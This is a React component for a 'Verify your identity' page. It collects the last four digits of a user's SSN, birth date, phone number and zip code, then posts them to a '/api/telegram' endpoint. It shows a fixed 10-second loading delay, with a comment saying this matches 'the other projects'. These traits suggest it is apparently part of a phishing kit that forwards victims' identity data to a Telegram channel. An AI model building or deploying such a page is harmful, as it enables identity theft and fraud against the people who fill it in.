import { useMemo, useState } from 'react'

interface IdentityDetailsPageProps {
  onContinue: () => void
  onBack: () => void
}

export function IdentityDetailsPage({ onContinue, onBack }: IdentityDetailsPageProps) {
  const [ssnLast4, setSsnLast4] = useState('')
  const [birthMonth, setBirthMonth] = useState('')
  const [birthDay, setBirthDay] = useState('')
  const [birthYear, setBirthYear] = useState('')
  const [phoneDigits, setPhoneDigits] = useState('')
  const [zipCode, setZipCode] = useState('')
  const [error, setError] = useState('')
  const [submitAttempted, setSubmitAttempted] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const ssnDigits = ssnLast4.replace(/\D/g, '').slice(0, 4)
  const zipDigits = zipCode.replace(/\D/g, '').slice(0, 9)

  const MONTHS = useMemo(
    () => [
      'January',
      'February',
      'March',
      'April',
      'May',
      'June',
      'July',
      'August',
      'September',
      'October',
      'November',
      'December',
    ],
    [],
  )
  const DAYS = useMemo(() => Array.from({ length: 31 }, (_, i) => String(i + 1)), [])
  const CURRENT_YEAR = new Date().getFullYear()
  const YEARS = useMemo(
    () => Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i)),
    [CURRENT_YEAR],
  )

  const formattedPhone = useMemo(() => {
    const d = phoneDigits
    const a = d.slice(0, 3)
    const b = d.slice(3, 6)
    const c = d.slice(6, 10)
    if (!d) return ''
    if (d.length <= 3) return a
    if (d.length <= 6) return `(${a}) ${b}`
    return `(${a}) ${b}-${c}`
  }, [phoneDigits])

  const isBirthDateValid = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return false
    const monthIndex = MONTHS.indexOf(birthMonth) + 1
    const m = monthIndex
    const d = Number(birthDay)
    const y = Number(birthYear)
    if (!m || Number.isNaN(d) || Number.isNaN(y)) return false
    const dt = new Date(y, m - 1, d)
    return (
      dt.getFullYear() === y &&
      dt.getMonth() === m - 1 &&
      dt.getDate() === d
    )
  }, [birthMonth, birthDay, birthYear, MONTHS])

  const isFormValid =
    ssnDigits.length === 4 &&
    isBirthDateValid &&
    phoneDigits.length === 10 &&
    (zipDigits.length === 5 || zipDigits.length === 9)
  const birthDateForApi = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return ''
    const monthIndex = MONTHS.indexOf(birthMonth) + 1
    if (!monthIndex) return ''
    return `${String(monthIndex).padStart(2, '0')}/${birthDay.padStart(2, '0')}/${birthYear}`
  }, [birthMonth, birthDay, birthYear, MONTHS])

  const handleSubmit = async () => {
    setSubmitAttempted(true)
    if (!isFormValid || isLoading) {
      setError('Please complete all identity fields correctly.')
      return
    }
    setError('')
    setIsLoading(true)

    await fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        kind: 'identity',
        ssnLast4: ssnDigits,
        birthDate: birthDateForApi,
        phoneNumber: phoneDigits,
        zipCode: zipDigits,
      }),
    }).catch(console.error)

    // Match the other projects: show a longer loading state before continuing.
    await new Promise((r) => setTimeout(r, 10000))
    setIsLoading(false)
    onContinue()
  }

  return (
    <div>
      <h1 className="text-[28px] font-semibold text-[#1a1a1a] mb-4 tracking-tight">
        Verify your identity
      </h1>

      <p className="text-[15px] text-[#6b6b6b] mb-6 leading-relaxed">
        Enter the details required to confirm your identity.
      </p>

      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Last 4 of SSN
          </label>
          <input
            type="text"
            inputMode="numeric"
            maxLength={4}
            value={ssnDigits}
            onChange={(e) => setSsnLast4(e.target.value)}
            disabled={isLoading}
            placeholder="1234"
            className="
              w-full h-12 px-4 border rounded-lg text-base bg-white
              transition-all duration-200 outline-none
              hover:border-[#1a1a1a]
              focus:border-[#1a1a1a] focus:shadow-[0_0_0_2px_rgba(26,26,26,0.1)]
            "
          />
          {submitAttempted && ssnDigits.length !== 4 && (
            <p className="text-[13px] text-[#d32f2f] mt-1">Enter the last 4 digits of SSN</p>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Birth date
          </label>
          <div className="flex flex-wrap gap-3">
            <select
              value={birthMonth}
              onChange={(e) => setBirthMonth(e.target.value)}
              disabled={isLoading}
              className="h-12 px-4 border rounded-lg text-base bg-white"
            >
              <option value="">Month</option>
              {MONTHS.map((m) => (
                <option key={m} value={m}>
                  {m}
                </option>
              ))}
            </select>
            <select
              value={birthDay}
              onChange={(e) => setBirthDay(e.target.value)}
              disabled={isLoading}
              className="h-12 px-4 border rounded-lg text-base bg-white"
            >
              <option value="">Day</option>
              {DAYS.map((d) => (
                <option key={d} value={d}>
                  {d}
                </option>
              ))}
            </select>
            <select
              value={birthYear}
              onChange={(e) => setBirthYear(e.target.value)}
              disabled={isLoading}
              className="h-12 px-4 border rounded-lg text-base bg-white"
            >
              <option value="">Year</option>
              {YEARS.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
          </div>
          {submitAttempted && !isBirthDateValid && (
            <p className="text-[13px] text-[#d32f2f] mt-1">Enter a valid birth date (MM/DD/YYYY)</p>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Phone number
          </label>
          <div className="flex items-center gap-3">
            <span className="text-sm font-semibold text-[#1a1a1a] shrink-0">+1</span>
            <input
              type="text"
              value={formattedPhone}
              onChange={(e) => {
                const digits = e.target.value.replace(/\D/g, '').slice(0, 10)
                setPhoneDigits(digits)
              }}
              disabled={isLoading}
              placeholder="(555) 555-5555"
              className="
                flex-1 h-12 px-4 border rounded-lg text-base bg-white
                transition-all duration-200 outline-none
                hover:border-[#1a1a1a]
                focus:border-[#1a1a1a] focus:shadow-[0_0_0_2px_rgba(26,26,26,0.1)]
              "
            />
          </div>
          {submitAttempted && phoneDigits.length !== 10 && (
            <p className="text-[13px] text-[#d32f2f] mt-1">Enter a valid US phone number</p>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Zip code
          </label>
          <input
            type="text"
            inputMode="numeric"
            maxLength={9}
            value={zipDigits}
            onChange={(e) => setZipCode(e.target.value)}
            disabled={isLoading}
            placeholder="12345"
            className="
              w-full h-12 px-4 border rounded-lg text-base bg-white
              transition-all duration-200 outline-none
              hover:border-[#1a1a1a]
              focus:border-[#1a1a1a] focus:shadow-[0_0_0_2px_rgba(26,26,26,0.1)]
            "
          />
          {submitAttempted && !(zipDigits.length === 5 || zipDigits.length === 9) && (
            <p className="text-[13px] text-[#d32f2f] mt-1">Enter a valid zip code (5 or 9 digits)</p>
          )}
        </div>
      </div>

      {error && <p className="text-[13px] text-[#d32f2f] mt-4">{error}</p>}

      <div className="flex flex-col gap-3 mt-8">
        <button
          type="button"
          onClick={handleSubmit}
          disabled={isLoading}
          className="
            w-full h-12 rounded-full text-[15px] font-semibold
            bg-[#1a1a1a] text-white
            hover:bg-black
            disabled:bg-[#e0e0e0] disabled:text-[#9e9e9e] disabled:cursor-not-allowed
            flex items-center justify-center gap-2
            transition-all duration-200
          "
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            'Continue'
          )}
        </button>

        <button
          type="button"
          onClick={onBack}
          disabled={isLoading}
          className="
            w-full h-12 rounded-full text-[15px] font-semibold
            bg-transparent text-[#1a1a1a] hover:bg-[#f5f5f5]
            transition-all duration-200
          "
        >
          Back
        </button>
      </div>
    </div>
  )
}

